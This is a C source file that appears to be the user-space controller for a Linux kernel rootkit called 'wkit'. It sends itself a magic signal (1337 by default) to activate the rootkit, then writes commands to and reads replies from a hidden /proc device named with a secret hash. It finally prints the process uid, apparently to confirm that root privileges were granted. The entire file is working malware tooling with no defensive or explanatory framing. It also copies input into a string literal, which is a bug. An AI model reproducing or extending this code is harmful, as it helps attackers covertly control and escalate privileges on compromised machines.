#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#define USUM_LEN 64

int main(int argc, const char** argv){
	if(argc < 2){
		printf("usage: %s <command> [usum] [signal]\n", argv[0]);
		return EXIT_SUCCESS;
	}

	char* usum = "c26cb4a24cb2faaab442669624b8cdca1e5a769ac3b60674c332422fedca0b3f";
	int signal = 1337;

	if(argc > 2){
		if(strlen(argv[2])!=USUM_LEN){
			printf("bad usum\n");
			return EXIT_FAILURE;
		}
		strcpy(usum, argv[2]);
	}

	if(argc > 3){
		signal = atoi(argv[3]);
	}
	
	if(kill(getpid(), signal)<0){
		printf("kill signal failed\n");
		return EXIT_FAILURE;
	}

	char dev_path[USUM_LEN+20];
	sprintf(dev_path, "/proc/wkit_dev%s", usum);

	int fd = open(dev_path, O_RDWR);
	if(fd<=0){
		printf("open failed\n");
		return EXIT_FAILURE;
	}

	char buff[30];
	if(read(fd, buff, sizeof(buff))<0){
		close(fd);
		printf("read failed\n");
		return EXIT_FAILURE;
	}
	printf("read: %s\n", buff);
	
	if(write(fd, argv[1], strlen(argv[1]))<0){
		close(fd);
		printf("write failed\n");
		return EXIT_FAILURE;
	}
	printf("write: %s\n", argv[1]);
	close(fd);

	fd = open(dev_path, O_RDWR);
	if(fd<=0){
		printf("open failed\n");
		return EXIT_FAILURE;
	}

	if(read(fd, buff, sizeof(buff))<0){
		close(fd);
		printf("read failed\n");
		return EXIT_FAILURE;
	}
	printf("read: %s\n", buff);
	printf("uid: %d\n", getuid());

	close(fd);
	return EXIT_SUCCESS;
}
